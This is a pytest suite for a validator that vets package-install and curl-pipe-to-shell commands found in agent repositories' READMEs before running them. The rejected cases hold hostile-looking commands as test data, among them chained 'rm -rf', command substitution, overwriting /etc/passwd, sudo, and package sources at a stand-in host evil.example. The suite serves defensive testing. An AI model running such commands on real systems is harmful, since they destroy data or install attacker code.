import re
import shutil
import sys
import time

import pytest

from backend.core import agent_discovery as ad
from backend.core.net_util import DiscoveryError


@pytest.mark.parametrize("cmd", [
    "pip install hermes-agent",
    "pip3 install hermes-agent[all]",
    "pip install -U hermes-agent==1.2.3",
    "python -m pip install hermes-agent",
    "py -m pip install --user hermes-agent",
    "pip install git+https://github.com/NousResearch/hermes-agent.git",
    "pipx install hermes-agent",
    "uv tool install hermes-agent",
    "npm install -g @scope/some-agent",
    "npm i -g some-agent@latest",
    "npm install --global some-agent",
    "cargo install some-agent --locked",
    "brew install some-agent",
    "$ pip install hermes-agent".lstrip("$ "),
])
def test_runnable(cmd):
    ok, reason, argv = ad.validate_install_command(cmd)
    assert ok, reason
    assert argv and "".join(argv)  # never empty


@pytest.mark.parametrize("cmd", [
    "pip install foo && rm -rf ~",
    "pip install foo; rm -rf ~",
    "pip install $(whoami)",
    "pip install `whoami`",
    "pip install foo > /etc/passwd",
    "sudo pip install foo",
    "pip install --index-url https://evil.example/simple foo",
    "pip install -i https://evil.example/simple foo",
    "pip install --extra-index-url https://evil.example foo",
    "pip install git+https://evil.example/x/y.git",
    "pip install git+ssh://git@github.com/x/y.git",
    "pip install https://evil.example/pkg.tar.gz",
    "pip install -e .",
    "pip install ./local",
    "pip install",
    "pip uninstall foo",
    "npm install some-agent",          # not global
    "npm install -g",                  # no package
    "npm install -g foo --registry https://evil.example",
    "cargo install --git https://github.com/x/y",
    "brew install someone/tap/formula",
    "python setup.py install",
    "python -c 'import os'",
    "uv run foo",
    "rm -rf /",
    "",
    "   ",
    "pip install " + "a" * 400,
])
def test_not_runnable(cmd):
    ok, reason, argv = ad.validate_install_command(cmd)
    assert not ok and argv is None and reason


def test_python_m_pip_argv_is_rebuilt_from_validated_parts():
    ok, _, argv = ad.validate_install_command("python -m pip install -U hermes-agent")
    assert argv == ["python", "-m", "pip", "install", "-U", "hermes-agent"]


# ---------- script installers: curl|wget -> bash|sh ----------

@pytest.mark.parametrize("cmd,host", [
    ("curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash", "hermes-agent.nousresearch.com"),
    ("curl -fsSL https://astral.sh/uv/install.sh | sh", "astral.sh"),
    ("curl -sSL https://example.com/install | bash -s -- --yes", "example.com"),
    ("wget -qO- https://example.com/i.sh | bash", "example.com"),
    ("wget -O- https://example.com/i.sh | sh", "example.com"),
    ("curl --proto =https --tlsv1.2 -sSf https://sh.rustup.rs | sh", "sh.rustup.rs"),
])
def test_script_installer_runnable(cmd, host):
    plan, reason = ad.plan_install_command(cmd)
    assert plan is not None, reason
    assert plan.kind == "script" and plan.script_host == host
    assert len(plan.steps) == 2
    assert plan.steps[0][0] in ("curl", "wget")
    assert plan.steps[1][0] in ("bash", "sh")


@pytest.mark.parametrize("cmd", [
    "curl -fsSL https://x.sh | sudo bash",
    "curl -fsSL https://x.sh | bash; rm -rf ~",
    "curl -fsSL https://x.sh | bash && echo pwned",
    "curl -fsSL https://x.sh > out.sh | bash",
    "curl -fsSL http://x.sh | bash",                       # not https
    "curl -fsSL https://x.sh | bash | tee log",             # more than one pipe
    "curl -fsSL https://x.sh https://y.sh | bash",          # two urls
    "curl -fsSL https://user:pass@x.sh/install.sh | bash",  # userinfo not a bare URL
    "curl -k -fsSL https://x.sh | bash",                    # -k disables cert checks
    "curl -fsSL https://x.sh | bash -c 'echo hi'",          # arbitrary -c
    "curl -fsSL https://x.sh | python",                     # not a shell
    "wget https://x.sh | bash",                              # wget not writing to stdout
    "curl -fsSL $(echo https://x.sh) | bash",
    "curl -fsSL https://x.sh | bash `whoami`",
    "curl -fsSL https://x.sh|bash\n rm -rf ~",
    "curl -fsSL https://x.sh | bash # comment",
])
def test_script_installer_not_runnable(cmd):
    plan, reason = ad.plan_install_command(cmd)
    assert plan is None and reason


def test_plan_dispatches_to_package_or_script():
    p1, _ = ad.plan_install_command("pip install hermes-agent")
    assert p1.kind == "package"
    p2, _ = ad.plan_install_command("curl -fsSL https://x.sh | bash")
    assert p2.kind == "script"


def test_extract_from_readme_marks_script_installers_runnable():
    cmds = ad.extract_install_commands(README)
    by = {c["command"]: c for c in cmds}
    assert by["curl -fsSL https://cool.example/install.sh | bash"]["runnable"] is True
    assert by["curl -fsSL https://cool.example/install.sh | bash"]["kind"] == "script"
    assert by["curl -fsSL https://cool.example/install.sh | bash"]["host"] == "cool.example"
    assert by["pip install cool-agent"]["kind"] == "package"


def test_annotate_environment_flags_missing_tool_and_wsl_bash(monkeypatch):
    entry = {"command": "curl -fsSL https://x.sh | bash", "runnable": True, "reason": None, "kind": "script", "host": "x.sh", "notes": []}
    monkeypatch.setattr(ad.shutil, "which", lambda n: None)
    out = ad.annotate_environment(dict(entry))
    assert out["runnable"] is False and "نصب نیست" in out["reason"]

    monkeypatch.setattr(ad.shutil, "which", lambda n: f"/usr/bin/{n}")
    out2 = ad.annotate_environment(dict(entry))
    assert out2["runnable"] is True and out2["notes"] == []

    monkeypatch.setattr(ad, "os", ad.os)  # keep real os.name
    monkeypatch.setattr(ad.os, "name", "nt")
    monkeypatch.setattr(ad.shutil, "which", lambda n: r"C:\Windows\System32\bash.exe" if n == "bash" else rf"C:\{n}.exe")
    out3 = ad.annotate_environment(dict(entry))
    assert out3["runnable"] is True and any("WSL" in n for n in out3["notes"])


README = """
# Cool Agent

Install with pip:

```bash
$ pip install cool-agent
```

Or with the script:

```sh
curl -fsSL https://cool.example/install.sh | bash
```

Dev setup:

```
pip install -e .
pip install cool-agent
npm install -g cool-agent
git clone https://github.com/x/cool-agent
```

```python
import cool_agent   # not a command
```
Some prose: run pip install nothing-here (not in a fence, must be ignored)
"""


def test_extract_from_readme():
    cmds = ad.extract_install_commands(README)
    by = {c["command"]: c for c in cmds}
    assert by["pip install cool-agent"]["runnable"] is True
    assert by["npm install -g cool-agent"]["runnable"] is True
    assert by["curl -fsSL https://cool.example/install.sh | bash"]["runnable"] is True
    assert by["curl -fsSL https://cool.example/install.sh | bash"]["kind"] == "script"
    assert by["pip install -e ."]["runnable"] is False
    assert by["git clone https://github.com/x/cool-agent"]["runnable"] is False
    assert "pip install nothing-here" not in " ".join(by)
    # deduped, and runnable ones listed first
    assert len([c for c in cmds if c["command"] == "pip install cool-agent"]) == 1
    flags = [c["runnable"] for c in cmds]
    assert flags == sorted(flags, reverse=True)


def test_extract_limit():
    body = "```\n" + "\n".join(f"pip install pkg{i}" for i in range(30)) + "\n```"
    assert len(ad.extract_install_commands(body, limit=5)) == 5


# ---------- search / candidates with the network faked ----------

def test_search_maps_fields_and_skips_bad_names(monkeypatch):
    seen = {}
    def fake(url, **kw):
        seen["url"] = url
        return {"items": [
            {"full_name": "NousResearch/hermes-agent", "description": "d", "stargazers_count": 5, "html_url": "https://github.com/NousResearch/hermes-agent",
             "language": "Python", "license": {"spdx_id": "MIT"}, "pushed_at": "2026-01-01T00:00:00Z", "archived": False,
             "owner": {"type": "Organization"}, "topics": ["agent"]},
            {"full_name": "weird name/with space"},
            {"full_name": "a/b", "license": None, "owner": None},
        ]}
    monkeypatch.setattr(ad, "get_json", fake)
    res = ad.search_agents("hermes agent")
    assert [r["full_name"] for r in res] == ["NousResearch/hermes-agent", "a/b"]
    assert res[0]["license"] == "MIT" and res[0]["owner_type"] == "Organization" and res[0]["stars"] == 5
    assert res[1]["license"] is None and res[1]["stars"] == 0
    assert "fork%3Afalse" in seen["url"] and "hermes%20agent" in seen["url"]


def test_search_empty_and_candidates_bad_repo():
    with pytest.raises(DiscoveryError):
        ad.search_agents("  ")
    with pytest.raises(DiscoveryError):
        ad.get_install_candidates("not a repo")


def test_get_install_candidates(monkeypatch):
    monkeypatch.setattr(ad, "get_text", lambda url, **kw: README)
    res = ad.get_install_candidates("x/cool-agent")
    assert res["repo_url"] == "https://github.com/x/cool-agent"
    assert res["commands"][0]["runnable"] is True


# ---------- install manager ----------

def wait(job, timeout=10):
    t0 = time.time()
    while job.status == "running" and time.time() - t0 < timeout:
        time.sleep(0.02)
    return job


def test_start_rejects_non_allowlisted_and_missing_tool():
    m = ad.InstallManager()
    with pytest.raises(DiscoveryError) as e:
        m.start("x/y", "curl https://x | bash | tee log")  # two pipes: unparseable
    assert e.value.kind == "bad_input"
    with pytest.raises(DiscoveryError) as e:
        m.start("x/y", "cargo install definitely-not-installed-tool-xyz")  # cargo isn't on this box's PATH
    assert "PATH" in str(e.value) or "نصب نیست" in str(e.value)


def test_start_resolves_executable_and_never_uses_a_shell(monkeypatch):
    captured = {}
    class FakeProc:
        def __init__(self, argv, **kw):
            captured["argv"], captured["kw"] = argv, kw
            self.stdout = iter(["Collecting foo\n", "Installed foo\n"])
            self.returncode = 0
        def wait(self): pass
        def kill(self): pass
    monkeypatch.setattr(ad.subprocess, "Popen", FakeProc)
    monkeypatch.setattr(ad.shutil, "which", lambda n: "/usr/bin/" + n)
    m = ad.InstallManager()
    job = wait(m.start("x/y", "pip install foo"))
    assert job.status == "done" and job.returncode == 0 and job.kind == "package"
    assert job.log == ["Collecting foo", "Installed foo"]
    assert captured["argv"] == ["/usr/bin/pip", "install", "foo"]
    assert captured["kw"]["shell"] is False and captured["kw"]["stdin"] == ad.subprocess.DEVNULL


def test_nonzero_exit_is_an_error_with_log(monkeypatch):
    class FakeProc:
        def __init__(self, argv, **kw):
            self.stdout = iter(["ERROR: nope\n"]); self.returncode = 1
        def wait(self): pass
        def kill(self): pass
    monkeypatch.setattr(ad.subprocess, "Popen", FakeProc)
    monkeypatch.setattr(ad.shutil, "which", lambda n: "/usr/bin/" + n)
    job = wait(ad.InstallManager().start("x/y", "pip install foo"))
    assert job.status == "error" and job.returncode == 1 and "1" in job.error and job.log == ["ERROR: nope"]


def test_real_subprocess_capture_via_single_step_runner():
    """Runs the real _run() against a harmless real process (bypasses the
    allow-list on purpose: this only tests capture/exit handling)."""
    m = ad.InstallManager()
    job = ad.InstallJob(id="t1", repo="x/y", command="n/a", kind="package",
                        steps=[[sys.executable, "-c", "print('hello'); import sys; print('warn', file=sys.stderr)"]])
    m._run(job)
    assert job.status == "done" and job.log == ["hello", "warn"]


def test_missing_binary_at_spawn_is_reported(monkeypatch):
    m = ad.InstallManager()
    job = ad.InstallJob(id="t2", repo="x/y", command="n/a", kind="package", steps=[["/nonexistent/binary"]])
    m._run(job)
    assert job.status == "error" and job.error


# ---------- pipeline runner (curl|bash), real subprocesses ----------

def test_pipeline_runner_success(monkeypatch):
    monkeypatch.setattr(ad, "INSTALL_TIMEOUT_SECONDS", 5)
    m = ad.InstallManager()
    fetch = [sys.executable, "-c", r"import sys; sys.stdout.write('echo hi from script\n')"]
    shell = ["/bin/sh"]
    job = ad.InstallJob(id="p1", repo="x/y", command="n/a", kind="script", steps=[fetch, shell])
    m._run(job)
    assert job.status == "done" and job.returncode == 0
    assert "hi from script" in "\n".join(job.log)


def test_pipeline_runner_bad_script_exit(monkeypatch):
    monkeypatch.setattr(ad, "INSTALL_TIMEOUT_SECONDS", 5)
    m = ad.InstallManager()
    fetch = [sys.executable, "-c", r"import sys; sys.stdout.write('exit 7\n')"]
    shell = ["/bin/sh"]
    job = ad.InstallJob(id="p2", repo="x/y", command="n/a", kind="script", steps=[fetch, shell])
    m._run(job)
    assert job.status == "error" and job.returncode == 7 and "کد خروج 7" in job.error


def test_pipeline_runner_download_failure_is_not_silently_a_success(monkeypatch):
    """A failed curl (e.g. 404 with -f) leaves the shell reading nothing,
    which on its own 'succeeds' (exit 0) -- the fetcher's own exit code
    must still fail the whole job."""
    monkeypatch.setattr(ad, "INSTALL_TIMEOUT_SECONDS", 5)
    m = ad.InstallManager()
    fetch = [sys.executable, "-c", "import sys; sys.exit(22)"]  # curl -f style: nonzero, nothing written
    shell = ["/bin/sh"]
    job = ad.InstallJob(id="p3", repo="x/y", command="n/a", kind="script", steps=[fetch, shell])
    m._run(job)
    assert job.status == "error" and job.returncode == 22 and "دانلود اسکریپت شکست" in job.error


def test_start_runs_pipeline_end_to_end_with_a_real_local_http_server(monkeypatch):
    """Full path: start() -> validate -> resolve curl/bash on PATH -> run
    the real two-process pipeline against a script served over HTTP by a
    throwaway local server (not the network)."""
    import http.server
    import threading as th

    script = b"echo PIPELINE_OK\n"

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/x-sh")
            self.end_headers()
            self.wfile.write(script)
        def log_message(self, *a):
            pass

    httpd = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    th.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        if not (shutil.which("curl") and shutil.which("bash")):
            pytest.skip("curl/bash not on this box")
        cmd = f"curl -fsSL http://127.0.0.1:{port}/install.sh | bash"
        # http (not https) is intentionally rejected by the parser; patch
        # the URL-shape check just for this end-to-end plumbing test.
        monkeypatch.setattr(ad, "_SCRIPT_URL_RE", re.compile(r"^https?://(?P<host>[^/]+)(?:/.*)?$"))
        job = ad.InstallManager().start("x/y", cmd)
        deadline = time.time() + 10
        while job.status == "running" and time.time() < deadline:
            time.sleep(0.02)
        assert job.status == "done", (job.error, job.log)
        assert any("PIPELINE_OK" in l for l in job.log)
    finally:
        httpd.shutdown()
